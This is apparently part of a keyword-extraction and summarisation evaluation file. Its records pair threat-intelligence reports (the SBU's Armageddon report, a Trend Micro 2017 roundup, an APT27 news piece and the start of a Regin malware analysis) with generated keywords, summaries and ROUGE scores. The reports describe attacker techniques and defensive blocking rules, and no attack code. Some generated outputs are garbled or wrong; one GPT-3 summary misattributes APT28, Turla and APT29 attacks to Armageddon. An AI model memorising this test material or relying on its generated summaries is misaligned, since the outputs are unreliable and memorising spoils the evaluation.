technology of dynamic [ORG] IP addresses ( DynamicDNS ) began . Subsequently , the list of these zones has expanded significantly and covered the full range of domain zones , which are assigned to the specified domain name registrar , namely : ddns.netddnsking.com3utilities.combounceme.netfreedynamicdns.netfreedynamicdns.orggotdns.chhopto.orgmyddns.memyftp.bizmyftp.orgmyvnc.comonthewifi.comredirectme.netservebeer.comserveblog.netservecounterstrike.comserveftp.comservegame.comservehalflife.comservehttp.comserveirc.comserveminecraft.netservemp3.comservepics.comservequake.comsytes.netviewdns.netwebhop.mezapto.orgAlso , in the period from [DATE] 2019 till [DATE] the [DATE] present [DATE] day , the following domain names were used to deliver malicious files and exfiltration data .online , .space , .site , .website as well as .ru . At the same time , regardless of the chosen C2 domain name , for deploying command & control servers hackers used exclusively [NORP] Russian telecommunication providers , most of which are [ORG] IP [ORG] Server [ORG] LLC , Hosting technology [GPE] LTD , [ORG] Sistema [ORG] Service [ORG] LLC , TimeWeb LLC , and [PRODUCT] SprintHost LLC.RU , LLC Registrar of domain names REG.RU , LLC R.I.M. 2000 M , [ORG] LLC [ORG] Management [ORG] Company [ORG] Svyaz . Such actions allow to change [ORG] IP addresses constantly according to current needs , especially to avoid block lists used by cybersecurity systems . ConclusionsAccording to the results of the hacker group [ORG] Armageddon evaluation it is concluded that even simple tactics , techniques and procedures , combined with social engineering methods and of cyberattacks on any information system and become a real cyber threat.successfulcanleadtoEstablished as a unit of the so - called \" FSB Office of Russia in [GPE] the [GPE] Republic [GPE] of [GPE] Crimea and the city of [LOC] Sevastopol \" , this group of individuals acted as an outpost for the implementation of [GPE] Russia 's aggressive policy against [GPE] Ukraine in cyberspace , from [DATE] 2014 purposefully threatening the proper functioning of state bodies and critical infrastructure of [GPE] Ukraine . That is the evidence of militarization of the peninsula in all its manifestations , violating the sovereignty of [GPE] Ukraine recognized by international law , as well as the rights and freedoms of the citizens of our state . RecommendationsIn order to prevent cyberattacks by the hacker [GPE] groupArmageddon , [ORG] the [ORG] Security [ORG] Service recommends the following:1 . Update system and application software promptly.2 . Deploy only licensed software products.3 . Block access to the Internet for MS Word , [PRODUCT] Excel and [ORG] PowerPoint completely ( prohibit office programs from initiating network connections ) , prohibit [ORG] MS [ORG] Office applications from running subsidiary processes , macros . Implement Attack Surface Reduction to protect [ORG] Microsoft [ORG] Office.url protection / microsoft - defender - atp / attack - surface - reduction)\uf02d block executable content from email client and webmail BE9BA2D9 - 53EA-4CDC-84E5 - 9B1EEEE46550\uf02d block all Office applications from creating child processesD4F940AB-401B-4EFC - AADC - AD5F3C50688A\uf02d block Office applications from creating executable content3B576869 - A4EC-4529 - 8536 - B80A7769E899\uf02d block Office applications from injecting code into otherprocesses 75668C1F-73B5 - 4CF0 - BB93 - 3ECF5CB7CC84\uf02d blocking [ORG] JavaScript or [ORG] VBScript from launching downloadexecutable content D3E037E1 - 3EB8 - 44C8 - A917 - 57927947596D\uf02d blocking execution of potentially obfuscated scripts5BEB7EFE - FD9A-4556 - 801D-275E5FFC04CC\uf02d block Win32 API calls from Office macros92E97FA1 - 2EDF-4476 - BDD6 - 9DD0B4DDDC7B4 . Set controls and restrictions on the creation of executable files with user profiles ( .exe , .bin , .ini , .dll , .com , .sys,.bat , .js , etc . ) , as well as prohibit the unpacking of such files by archivers . Additionally , disable all executable files from [ORG] the % AppData% [ORG] directory.5 . Prohibit the use of cmd and powershell programs in the information system with user rights . Disable the ability to run any scripts ( * script.exe ) with the users \u2019 rights .6 . Prohibit the automatic launch of programs with the operating system , as well as access to programs in the system registry.7 . Pay attentionincoming e - mail , especially unexpectedly received e - mails from unknown e - mail addresses . If possible , check the sender of the letter . Do not open emails with signs of urgency or special importance immediately.to all8 . Before opening an attachment to an e - mail , you need to identify its extension ( it can be hidden or changed ) , check it with anti - virus software . Do not follow unknown links ( URLs ) attached to the email . Check their realism by previewing the link and determining the source to which they will actually be redirected by link . Cyber Security Situational Centre The Security Service of Ukraine 2021TacticsInitial AccessTechniques used in cyberattack(according to [ORG] MITRE [ORG] ATT [ORG] & [ORG] CK [ORG] Matrix ) IDNameDescriptionT1566.001Spearphishing Attachment.002 SpearphishingLinkGroup sends spear phishing emails with malicious attachments or links.001 PowerShellGroup executes ps1 scripts in systemCommand - Line [ORG] Interface [ORG] Group executes cmd scripts in [LOC] systemT1059.005 [LOC] Visual [LOC] Basic.005 Scheduled TaskWMIT1053T1047ExecutionT1059T1559.001Inter - Process Communication : Compon ent [ORG] Object [ORG] ModelT1106Native [ORG] APIT1204.001User [ORG] Execution : Malicious LinkT1204.002User Execution : Malicious FileT1547.001Regisry [ORG] Keys / Startup [ORG] FolderPersistenceT1137.001Office [ORG] Application Startup : Jffice Template MacrosGroup executes numerous vbs scripts in systemGroup sets up scheduled tasks to launch scripts and downloaded tasklistGroup uses [ORG] WMI commands in code to retrieve system informationGroup embeds macros into documentsScripts has used [ORG] CreateProcess to launch additional malicious components [ORG] Group uses technics to encourage users to click on malicious links from phishing emails [ORG] Group uses technics to encourage users to click on malicious [ORG] Office attachments or archives Group actively sets up and uses [PERSON] Regisry [PERSON] Keys values and puts scripts into startup foldersGroup inserts malicious macros into existing documents , providing persistence when they are reopened . Creates a special template with remote connection code . Lots of delivered malicious files have encoded scripts , for instance inserting junk codeObfuscated [PERSON] Files or [PERSON] Files or [ORG] InformationGroup uses [WORK_OF_ART] XOR method to decode information from payloadsT1070.004Indicator Removal on Host : File DeletionT1112Modify [ORG] RegistryScripts can delete files used during an cyber attack Actively changing registry security settings for [ORG] VBA macro HKCU\\Software\\Microsoft\\Office\\<versio n>\\<product>\\Security\\VBAWarnings andT1036T1221MasqueradingTemplate InjectionT1497.002Virtualization / Sandbox EvasionT1218.011Signed Binary Proxy Execution : [ORG] Rundll32HKCU\\Software\\Microsoft\\Office\\<versio [ORG] n>\\<product>\\Security\\AccessVBOM [ORG] Group places components into [PRODUCT] Windows folder with names mimicking common system services or driversDOCX files contain a request body to download malicious [ORG] DOT document templates [PERSON] Malware pings for [ORG] DNS servers and checks for launched processes . Also try to identify sandbox name and compare it with hardcoded namelist [ORG] Malware has used [PERSON] rundll32 to launch additional malicious [GPE] componentsCredentialAccessT1003DiscoveryLateralMovementT1082T1120T1033T1091T1534T1025T1113T1119Command and ControlT1105T1219ExfiltrationT1041Credential DumpingMimikatz on numerous PC was executedSystem Information DiscoveryDuring cyber attack [ORDINAL] first stage scripts always collect system information and send it to C2Peripheral Device Discovery System Owner / User DiscoveryReplication Through Removable MediaInternal SpearphishingData from Removable MediaScreen CaptureAutomated CollectionMalware files hunt for removable storages [PRODUCT] Filestealers can gather the victim 's usernameScripts have capabilities to copy malware on / from removable drives on / from user \u2019s systemUse compromised emails to send phishing emails with malicious attachments to other employees within the organization [ORG] Collect documents from [ORG] Removable [ORG] Media while its connected to a systemmalware has functionality to make screenshots periodically [ORG] Group uses scripts to collect electronic documents with certain extentionsIngress Tool TransferRemote Access ToolsMalware has capabilities of downloading and executing additional payloads RMS and UltraVNC software were usedExfiltration Over C2 [ORG] ChannelScripts transfer collected data to [CARDINAL] C2", "generated_text": "The document; the activities; \"Armageddon; 2014; the security service; Russian Federation; the organization; spear; spear; part; the Federal Security Service; the Russian Federation; the group; Russian intelligence; tactics; techniques; procedures; analysis; the group; the 2014-2020 period; a new real cyber threat; the group; capabilities; the cyberthreat; the threat.", "ref_text": "<START-1>The report details the activities of a Russian state-sponsored hacker group called Armageddon. This group is believed to have been formed in 2013-2014 as part of Russia's Federal Security Service. The group's purpose is to conduct cyber espionage against Ukraine through phishing campaigns, custom malware, and exfiltrating sensitive documents. The group relies heavily on spear-phishing emails with malicious attachments or links as its initial attack vector. Once a target system is compromised, Armageddon uses various tactics like scripts, task scheduling, and registry modifications to maintain persistence. They employ obfuscation techniques to avoid detection. Custom malware like Pterodo and FileStealer are used to gather intelligence. Pterodo is a modular remote access tool that can download other modules, take screenshots, access microphones and cameras, and more. FileStealer specifically looks for Office documents, PDFs, images, and other files to exfiltrate. Removable media like USB drives are leveraged to move laterally and exfiltrate data from air-gapped systems. Stolen documents and screenshots are typically sent back to command and control servers hosted with Russian providers. The report details the group's evolution in tactics, techniques, and procedures over time. It provides recommendations for preventing attacks, including promptly patching systems, restricting Office macros, monitoring email attachments, and limiting script execution. Though Armageddon uses relatively simple methods, the report shows how a determined, targeted campaign can effectively compromise systems. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3526570048309179, "gpt3/lexical/rouge_rouge2": 0.07766990291262137, "gpt3/lexical/rouge_rougeL": 0.16908212560386476, "gpt3/lexical/rouge_rougeLsum": 0.16908212560386476, "gpt3_generated_text": ["This article discusses the activities of the hacker group \"Armageddon\" and its role as an Advanced Persistent Threat (APT) associated with the Russian Federation's Federal Security Service. The Security Service of Ukraine has reliable data on cyberattacks conducted by this group, including APT28 (Sofacy/Fancy Bear), SNAKE (Turla), and APT29 (Cozy Bear/The Dukes). The article highlights that while these APT groups are well-known, \"Armageddon\" is a relatively young group that has been under the radar since its inception in 2013-2014. The Security Service of Ukraine believes that this group poses a significant cyber threat, possibly surpassing the negative effects of other APT groups. The article also provides insights into the tactics, techniques, and procedures used by \"Armageddon,\" including their focus on targeting Ukrainian state bodies, their use of various programming languages and command shells, and their preference for Windows systems. The article suggests that the group's activities can be divided into two periods: from 2014 to 2017 and from 2017 to the present. Overall, the article emphasizes the need for attention from competent authorities to address the cyberthreat posed by \"Armageddon.\""]}, {"split_name": "val", "sample_id": "val_109", "prompt_text": "Extract the keywords: [DATE] The [DATE] past [DATE] year saw massive ransomware outbreaks turn into global events that reportedly cost enterprises [MONEY] billions [MONEY] of [MONEY] dollars . We also saw familiar threats like business email compromise ( BEC ) continue to be a consistent danger for enterprises . Meanwhile , volatile cryptocurrencies disrupted the threat landscape as their value steeply and quickly rose . To function in this environment , cybercriminals reworked old techniques to take advantage of the crypto - trends and also tried to exploit known vulnerabilities in new ways . ransomware - icon - roundup [ORG] Ransomware brings about bigger global outbreaks despite fewer major players The number of new ransomware families rose [PERCENT] 32 [PERCENT] percent from [DATE] 2016 to [CARDINAL] 327 , showing that there were still active ransomware developers trying to take advantage of a plateauing trend . However , the ransomware - related threats detected by [ORG] the [ORG] Trend Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Network \u2122 security infrastructure went in the opposite direction and dipped [PERCENT] 41 [PERCENT] percent . Apparently , only a select few of these new families actually made an impact in [DATE] 2017 . [ORG] MORE [ORG] RANSOMWARE [ORG] FAMILIES [ORG] EMERGED IN [DATE] 2017 : COMPARISON OF TOTAL NUMBER OF NEW RANSOMWARE FAMILIES SEEN ransomware - colored - icon - roundup [CARDINAL] 247 [DATE] 2016 NEW FAMILIES ransomware - colored - icon - roundup-2 [CARDINAL] 327 [CARDINAL] 2017 NEW FAMILIES FEWER MAJOR PLAYERS DESPITE INCREASE IN NEW RANSOMWARE FAMILIES : COMPARISON OF TOTAL NUMBER OF DETECTED RANSOMWARE - RELATED THREATS [DATE] 1,078,091,703 [DATE] 2016 RANSOMWARE - RELATED THREATS 631,128,278 2017 RANSOMWARE - RELATED THREATS But the ransomware events that did affect users were significantly larger . These widespread attacks struck multiple countries and reportedly resulted in [MONEY] billions [MONEY] of [MONEY] U.S. [MONEY] dollars in damage . In addition to [ORG] WannaCry and [GPE] Petya , the [CARDINAL] two most notorious , there was the more recent case of Bad Rabbit : In [DATE] October , the ransomware hit a number of enterprises across [GPE] Russia , [LOC] Eastern [LOC] Europe and the [GPE] U.S. This was a marked difference from [DATE] 2016 , in which more ransomware incidents were reported , but the scale of the damage was typically contained to local offices and the ransom demanded was just in the [CARDINAL] tens [CARDINAL] of [CARDINAL] thousands [CARDINAL] of [CARDINAL] dollars . Prevailing - ransomware - families - roundup2017 PREVAILING RANSOMWARE FAMILIES : TOP RANSOMWARE FAMILIES IN [DATE] 2017 REMAINING FROM 2016 Ransomware remains a clear and steady threat as many old families still affect users worldwide . Meanwhile , the more recent virulent outbreaks show that the new families are growing more sophisticated and hitting larger targets . Developers are constantly experimenting , trying to find profitable strategies . In [DATE] 2017 , they used diverse new methods ; for example , more had been using fileless infection and pre - execution machine learning evasion techniques in addition to taking advantage of old vulnerabilities . Effective ransomware typically abuses known exploits and techniques . Enterprises should then be diligent and employ proper patching policies , while securing their systems with multilayered solutions . Several critical and controversial vulnerabilities were exploited by cybercriminals and used for major ransomware campaigns . Most notably , these included the known ones that were taken advantage of by the [PRODUCT] EternalBlue and EternalRomance exploits . The former was used in the [ORG] WannaCry and [GPE] Petya outbreaks , and the latter was used also in the [GPE] Petya attacks and later in the Bad Rabbit incident . Known vulnerabilities were exploited as well for purposes other than spreading ransomware . EternalBlue was also used by a cryptominer malware to spread filelessly . And the Linux vulnerability Dirty [ORG] COW was used by [PERSON] ZNIU to compromise specific [ORG] Android devices . ZERO - DAY VULNERABILITIESZERO - DAY VULNERABILITIES ( [ORG] SCADA ) A MARKED INCREASE IN ZERO - DAY [DATE] VULNERABILITIES : COMPARISON OF NUMBER OF ZERO - DAY VULNERABILITIES AND SCADA - RELATED ZERO - DAY VULNERABILITIES BETWEEN 2016 AND 2017 2017 also saw a substantial 98 - [PERCENT] percent increase in discovered zero - day vulnerabilities . Moreover , of the [CARDINAL] 119 zero - day vulnerabilities , all but [CARDINAL] six were related to supervisory control and data acquisition ( [ORG] SCADA ) . This increased focus on [GPE] SCADA is particularly significant since major industrial complexes and critical infrastructures rely on this control system architecture to function . If exploited , zero - day vulnerabilities could result in huge losses and damage . Past cases have emphasized the risk [ORG] BEC scams pose to all types of enterprises , from large multinationals to small businesses . But despite the increasing awareness , [ORG] BEC scams still prevailed and grew in [DATE] 2017 . [CARDINAL] One incident , which cost a [NORP] Japanese transportation company a reported US$ 3.4 [MONEY] million , happened just in [DATE] December . This particular scam centered on a popular technique called the supplier swindle : impersonating a [ORDINAL] third - party supplier and manipulating the company into transferring funds . In another incident reported in [DATE] July , a number of organizations in [GPE] Germany received fake memos from \u201c executives \u201d that asked accounting personnel to send funds to fraudulent accounts . Our data shows a steep rise of [PERCENT] about [PERCENT] 106 [PERCENT] percent in attempts from [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2017 to the second half . Consistent with [DATE] previous [DATE] years , the most targeted positions were finance - related : chief financial officer ( CFO ) , finance controller , finance manager and finance director . The most spoofed were high - level executives : chief executive officer ( CEO ) , managing director and president . [PERSON] RECORDED [PERSON] BEC [PERSON] ATTEMPTS IN [DATE] 2017 [DATE] 1H3175 [ORG] BEC - icon - roundup-3 [CARDINAL] 2H6533 [ORG] BEC - icon - roundup-2 [ORG] BEC [ORG] ATTEMPTS [ORG] MORE [ORG] THAN [ORG] DOUBLED IN [DATE] THE [DATE] SECOND [DATE] HALF [DATE] OF [DATE] THE [DATE] YEAR OVER THE FIRST HALF : COMPARISON OF BEC ATTEMPTS BETWEEN 1H AND 2H OF 2017 The value of cryptocurrency , particularly bitcoin , skyrocketed in [DATE] the [DATE] latter [DATE] half [DATE] of [DATE] 2017 . In [DATE] the [DATE] beginning [DATE] of [DATE] July , [CARDINAL] 1 bitcoin was valued at around US$ [MONEY] 2,500 , and by [DATE] Dec. [DATE] 31 , it was valued at [MONEY] over US$ 13,800 . That steep and quick increase apparently prompted cybercriminals to target cryptocurrency through different methods . Some used social engineering attacks to directly target cryptocurrency wallets , while others evolved old ransomware threats to do the same . There were even attempts to mine cryptocurrency through mobile malware , despite the improbability of gaining any substantial amount by that means . how - attackers - targeted - cryptocurrency Some businesses had tried to capitalize on cryptocurrency by using mining software as alternatives to web advertising , but cybercriminals were also quick to take advantage . In [DATE] mid-2017 , cybercriminals started abusing the most popular of the open - source mining tools , Coinhive . By [DATE] November , an abused variant of the Coinhive miner ranked as the [ORDINAL] sixth most common malware in the world , even though it was intended to be a legitimate alternative method of making money for websites . These are particularly relevant threats since businesses are starting to use cryptocurrency and even launch their own ; governments , including those of [GPE] Venezuela and [GPE] Dubai , [GPE] United [GPE] Arab [GPE] Emirates , are also establishing their own cryptocurrencies . Security solutions with high - fidelity machine learning , web reputation services , behavior monitoring and application control could help minimize the impact of these threats . [ORG] The [ORG] Trend Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Network \u2122 security infrastructure blocked [MONEY] more [MONEY] than [MONEY] 66 [MONEY] billion threats in [DATE] 2017 . [PERCENT] Over [PERCENT] 85 [PERCENT] percent of these threats were emails that contained malicious content \u2014 emails have consistently been the most popular entry point for cybercriminals to reach users . Overall threats blocked [CARDINAL] 28,658,837,969 [CARDINAL] 1H 2017 38,451,584,224 2H [DATE] 2016 53,226,272,934 2H 2017 27,985,396,490 FEWER THREATS BLOCKED IN [CARDINAL] 2017 THAN IN [DATE] 2016 : OVERALL THREATS BLOCKED BY THE TREND MICRO SMART PROTECTION NETWORK INFRASTRUCTURE , [DATE] 2016 VS . [DATE] 2017 By comparison , over [CARDINAL] 81 [CARDINAL] billion threats were blocked in [DATE] 2016 . We believe that the drop in the number of threats can be attributed to a shift from \u201c spray and pray \u201d methods to a more targeted approach to attacks . A VARIATION IN VULNERABILITY COUNT DIRECTION : COMPARISON OF NUMBER OF VULNERABILITIES FOUND PER VENDOR [DATE] BETWEEN [DATE] 2016 [DATE] AND [DATE] 2017 [DATE] Event \t [DATE] Number [DATE] of [DATE] Events [DATE] Cryptocurrency mining \t [CARDINAL] 45,630,097 TELNET default password login \t [CARDINAL] 30,116,181 MS17 - 010 SMB \t [CARDINAL] 12,164,033 [ORG] Brute - force login \t [CARDINAL] 3,695,143 ICMP BlackNurse \t [CARDINAL] 1,792,854 Others \t [CARDINAL] 16,701,211 CRYPTOCURRENCY MINING AND TELNET EVENTS OUTNUMBERED OTHERS : NETWORK EVENTS IN [DATE] 2017 BASED ON DATA FROM THE TREND MICRO \u2122 [ORG] SMART [ORG] HOME [ORG] NETWORK [ORG] SOLUTION Year \t [ORG] Data breaches disclosed \t [NORP] Affected records [DATE] 2016 \t [CARDINAL] 813 \t 3,310,435,941 2017 \t [CARDINAL] 553 \t 4,923,053,245 FEWER DISCLOSURES , GREATER NUMBER OF AFFECTED RECORDS : COMPARISON OF THE NUMBER OF DATA BREACHES DISCLOSED AND THE NUMBER OF AFFECTED RECORDS [DATE] BETWEEN [DATE] 2016 [DATE] AND [DATE] 2017 * Note : Yahoo \u2019s data breach disclosure reported in [DATE] October [DATE] 2017 is reflected in the number of affected records for [DATE] 2017 . The figures are computed based on data from [ORG] Privacy [ORG] Rights [ORG] Clearinghouse . Other significant security stories of [DATE] 2017 are included in our roundup , where we give details on how cybercriminals abused networked internet - of - things ( [ORG] IoT ) devices and how big companies were hit by massive data breaches . Read our [DATE] annual security roundup report and learn what \u2019s new in the threat landscape and the security strategies you can employ against current and emerging threats .", "generated_text": "Ransomware; 2017; organizations; billions; US dollars; WannaCry; Petya; Bad Rabbit; new families; attacks; tens; thousands; a variety; use; known exploits; techniques; new ransomware targets; Malware; EternalBlue; EternalRomance; cryptminer; evasion techniques; DLLs; a variety; vulnerabilities; Analysis; fileless infection; machine learning; evasion techniques; a number; the number; the number; a plateauing trend; the number; 2016; more than a dozen; the number; 2016; 2016; RULE; devices; Trend Micro; cryptocurrencies; the number; risk; AV; a stable environment; the rise; the number; recent virulent outbreaks; companies; organizations.", "ref_text": "<START-1>The document provides an overview of major cybersecurity threats and trends in 2017 compared to 2016. Ransomware continued to be a major threat, with more new families emerging but fewer large-scale attacks than 2016. Major outbreaks like WannaCry and Petya caused more damage globally than typical ransomware. Known vulnerabilities like EternalBlue were exploited for ransomware campaigns. Business email compromise scams also increased significantly, doubling in the second half of 2017 compared to the first half. Cryptocurrency became a big target for cybercriminals as bitcoin valuations skyrocketed. They used social engineering and evolved old ransomware to steal cryptocurrency. Coin mining malware also emerged to abuse the rise in cryptocurrencies. Overall threats blocked by Trend Micro dropped from 2016, indicating a shift from broad attacks to more targeted ones. But data breaches disclosed affected even more records, including major breaches at Yahoo. The report highlights key threats like ransomware, business email compromise scams, cryptocurrency abuse, and data breaches. It notes the shift from broad spam campaigns to more targeted attacks. It advises using security solutions with capabilities like machine learning, behavior monitoring, and application control to detect latest threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3622047244094488, "gpt3/lexical/rouge_rouge2": 0.052770448548812667, "gpt3/lexical/rouge_rougeL": 0.15223097112860892, "gpt3/lexical/rouge_rougeLsum": 0.15223097112860892, "gpt3_generated_text": ["The past year saw a significant increase in ransomware attacks, with new families of ransomware emerging and targeting organizations worldwide. While the number of new ransomware families rose by 32%, the number of ransomware-related threats detected by security infrastructure dipped by 41%. However, the ransomware events that did occur had a much larger impact, affecting multiple countries and resulting in billions of dollars in damage. The most notable ransomware outbreaks of 2017 were WannaCry, Petya, and Bad Rabbit. Developers of ransomware are constantly experimenting with new methods, including fileless infection and machine learning evasion techniques, as well as exploiting known vulnerabilities. Many of these attacks utilized known exploits such as EternalBlue and EternalRomance. Additionally, there was a substantial increase in zero-day vulnerabilities, with all but six of the 119 discovered vulnerabilities being related to supervisory control and data acquisition (SCADA) systems. Business email compromise (BEC) scams also persisted and grew in 2017, with one incident costing a Japanese transportation company $3.4 million. Overall, the threat landscape for organizations in 2017 was characterized by the rise of new ransomware families, the exploitation of known vulnerabilities, and the persistence of BEC scams."]}, {"split_name": "val", "sample_id": "val_110", "prompt_text": "Extract the keywords: [NORP] German govt warns of APT27 hackers backdooring business networksbleepingcomputer.com/news/security/german-govt-warns-of-apt27-hackers-backdooring-business-networksThe [PERSON] BfV [NORP] German domestic intelligence services ( short for Bun des amt f\u00fcr Ver fas sungs - schutz ) warn of ongoing attacks coordinated by the APT27 [NORP] Chinese - backed hacking group . This active campaign is targeting [NORP] German commercial organizations , with the attackers using the [ORG] HyperBro remote access trojans ( RAT ) to backdoor their networks . [ORG] HyperBro helps the threat actors maintain persistence on the victims ' networks by acting as an in - memory backdoor with remote administration capabilities . The agency said the threat group 's goal is to steal sensitive information and may also attempt to target their victims ' customers in supply chain attacks . [ORG] \"The [ORG] Federal [ORG] Office [ORG] for [ORG] the [ORG] Protection [ORG] of [ORG] the [ORG] Constitution ( [ORG] BfV ( [ORG] Federal [ORG] Office [ORG] for [ORG] the [ORG] Protection [ORG] of [ORG] the [ORG] Constitution ) ) has information about an ongoing cyber espionage campaign by the cyber attack group APT27 using the malware variant HYPERBRO against [NORP] German commercial companies , \" the [PERSON] BfV said . \"It can not be ruled out that the actors , in addition to stealing business secrets and intellectual property , also try to infiltrate the networks of ( corporate ) customers or service providers ( supply chain attack).\"1/3The [PERSON] BfV also published indicators of compromise ( IOCs ) and [ORG] YARA rules to help targeted [NORP] German organizations to check for [ORG] HyperBro infections and connections to APT27 command - and - control ( C2 ) servers . [ORG] HyperBro infection chain ( BfV)Breaching networks via Zoho and [ORG] Exchange servers [PERSON] APT27 ( also tracked as [DATE] TG-3390 , Emissary Panda , [ORG] BRONZE [ORG] UNION , [PERSON] Iron [PERSON] Tiger , and [ORG] LuckyMouse ) is a [NORP] Chinese - sponsored threat group active since [CARDINAL] at [CARDINAL] least [CARDINAL] 2010 and known for its focus on information theft and cyberespionage campaigns . The [NORP] German intelligence agency says APT27 has been exploiting flaws in Zoho AdSelf Service Plus software , an enterprise password management solution for [WORK_OF_ART] Active [WORK_OF_ART] Directory and cloud apps , since [DATE] March 2021.This aligns with previous reports of [PERSON] Zoho [PERSON] ManageEngine installations being the target of multiple campaigns in [DATE] 2021 , coordinated by nation - state hackers using tactics and tooling similar to those employed by APT27.They [ORDINAL] first used an ADSelfService zero - day exploit until mid - September , then switched to an n - day [DATE] AdSelfService exploit , and started exploiting a [PRODUCT] ServiceDesk bug beginning with [DATE] October [DATE] 25.2/3Zoho [ORG] ManageEngine campaigns ( Unit 42)In these attacks , they successfully compromised [CARDINAL] at [CARDINAL] least [CARDINAL] nine organizations from critical sectors worldwide , including defense , healthcare , energy , technology , and education , according to [ORG] Palo [ORG] Alto [ORG] Networks researchers . In light of these campaigns , the [ORG] FBI and [ORG] CISA issued joint advisories ( [CARDINAL] 1 , 2 ) warning of [ORG] APT actors exploiting [ORG] ManageEngine flaws to drop web shells on the networks of breached critical infrastructure orgs . APT27 and other [NORP] Chinese - backed hacking groups were also linked to attacks exploiting critical [ORG] ProxyLogon bugs in [DATE] early [DATE] March [DATE] 2021 that allowed them to take over and steal data from unpatched [ORG] Microsoft [ORG] Exchange servers worldwide . [GPE] US and allies ( [ORG] the [ORG] European [ORG] Union , [GPE] the [GPE] United [GPE] Kingdom , and [ORG] NATO ) officially blamed [GPE] China in [DATE] June for [DATE] last year 's widespread [ORG] Microsoft [ORG] Exchange hacking campaign.3/3", "generated_text": "German; APT27; Chinese; ADSelfService; exploits; Zoho ManageEngine; HYPERBRO; use; companies; the attackers; persistence; the networks; memory; persistence; network access; RAT; attack; customers; supply chain attacks; attacks; sensitive information; supply chain attacks; the FBI; CISA; indicators; compromise; indicators; YARA rules; command; control; servers; attacks; ProxyLogon; Microsoft Exchange; attacks; intelligence; intelligence and defense; critical infrastructure orgs; attacks; the group; compromise; analysis; the group; weaponized databases; security; information.", "ref_text": "<START-1>The document describes warnings from Germany's BfV intelligence agency about ongoing cyberespionage attacks by the Chinese state-sponsored hacking group APT27. The attackers are targeting German commercial organizations by exploiting vulnerabilities to deploy the HyperBro remote access trojan (RAT) and backdoor their networks. APT27's goal is to steal sensitive information and possibly infiltrate the networks of the targeted companies' customers and service providers in supply chain attacks. The BfV published indicators of compromise and detection rules to help organizations check for infections. APT27 has been actively exploiting flaws in Zoho's AdSelfService Plus software since March 2021 to breach networks, similar to other campaigns targeting Zoho ManageEngine products last year. The group also exploited Exchange Server ProxyLogon vulnerabilities in March 2021 to compromise unpatched systems globally. APT27 is a long-running Chinese group active since 2010 and known for cyberespionage focused on stealing information. The United States and allies have officially blamed China for the widespread Exchange server attacks in 2021 tied to APT27 and other China-linked groups. In summary, Germany is warning businesses of ongoing cyberespionage activities by the Chinese-backed hacker group APT27 abusing software vulnerabilities to infiltrate and backdoor corporate networks to steal data. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.6196473551637279, "gpt3/lexical/rouge_rouge2": 0.24810126582278483, "gpt3/lexical/rouge_rougeL": 0.37279596977329976, "gpt3/lexical/rouge_rougeLsum": 0.37279596977329976, "gpt3_generated_text": ["The German domestic intelligence services, BfV, have issued a warning about ongoing cyberattacks conducted by the APT27 hacking group, which is backed by China. The group is targeting German commercial organizations using the HyperBro remote access trojans (RAT) to backdoor their networks. HyperBro acts as an in-memory backdoor with remote administration capabilities, allowing the threat actors to maintain persistence on the victims' networks. The goal of the attackers is to steal sensitive information and they may also attempt to target the customers of their victims through supply chain attacks. The BfV has provided indicators of compromise (IOCs) and YARA rules to help German organizations check for HyperBro infections and connections to APT27's command-and-control servers. APT27 has been exploiting vulnerabilities in Zoho AdSelf Service Plus software since March 2021. The group has successfully compromised at least nine organizations from critical sectors worldwide. The FBI and CISA have also issued advisories warning of APT actors exploiting vulnerabilities in Zoho ManageEngine to drop web shells on the networks of breached critical infrastructure organizations. APT27 and other Chinese-backed hacking groups were also linked to attacks exploiting critical ProxyLogon bugs in Microsoft Exchange servers in early 2021."]}, {"split_name": "val", "sample_id": "val_111", "prompt_text": "Extract the keywords: Malware analysisreportW32 / Regin , Stage # 1tlp : [ORG] wHite1 . INTRODUCTION [CARDINAL] 1.1 [PERSON] Sample [PERSON] Statistics2 22 2 . [PERSON] MALWARE [PERSON] ANALYSIS 3 2.1 Deployment and startup [CARDINAL] 3 [MONEY] 2.2 Sample selection [MONEY] 2.3 [MONEY] Content retrieval 3 2.4 Retrieval from the file system ( [ORG] Extended [ORG] Attributes ) [CARDINAL] 4 2.5 Retrieval from the registry [CARDINAL] 2.6 Decryption 4 2.7 Content mapping [CARDINAL] 5 [CARDINAL] 2.8 The QuickPeParse function [CARDINAL] 2.9 Header and sections [CARDINAL] 2.10 [ORG] Imports [ORG] & [ORG] Trampolines [CARDINAL] 2.10.1 Embedded code templates [PERCENT] 7 [PERCENT] 2.10.2 [PERCENT] Locating a safe location inside a trusted module [CARDINAL] 7 [CARDINAL] 8 [CARDINAL] 2.10.3 Code template customization [CARDINAL] 8 2.10.4 Trampolines [CARDINAL] 102.11 The CodeProtection structure [CARDINAL] 2.12 Relocations 2.13 Finalizing the loading process [CARDINAL] 2.14 Invocation of stage # [MONEY] 23 . CONCLUSIONS APPENDIX A : SAMPLE STATISTICS APPENDIX B : MEMSET SYSTEM CALL TRANSITION10 F - Secure Labs Twitter : @paolo_3_1415926Contact F - Secure Incident Response irt@f - secure.comIn this document we analyze a set of 32 - bit samples which represents stage # [MONEY] 1 of the complex threat that is known as Regin . Based on our analysis of the malware \u2019s functionalities , this part of the Regin threat can be considered just a support module \u2014 its sole purpose is to facilitate and enable the operations of stage # [MONEY] 2 by loading it and making it more difficult to detect by security products . Regin \u2019s stage # [MONEY] 1 targets the Windows platform and support various versions of the operating system , beginning with [EVENT] Windows [EVENT] NT [EVENT] 4.0 . Based on our analysis , the samples may be classified into [CARDINAL] two categories : \u201c pure \u201d samples that do not feature any extra , non - malicious code ; and \u201c augmented \u201d ones which feature malware code as part of another device driver . The existence of \u201c augmented \u201d samples indicates the intention of the attacker to remain undiscovered for as long as possible . When activated , samples of [ORG] Regin stage # [MONEY] 1 will retrieve encrypted content from specific locations of an already compromised system , map it into kernel memory and transfer control to it . In terms of technical sophistication , stage # [MONEY] 1 \u2019s import resolution process is of particular interest , as the malware uses the unusual \u201c trampoline \u201d technique to mask the payload \u2019s access to API functions . It is clear that this support component , that represents the initial stage of a very complex threat , has been instrumental in securing long - term persistence in the attacks that made use of this threat.1 . introDUCtionIn this document we describe the technical characteristics of a set of 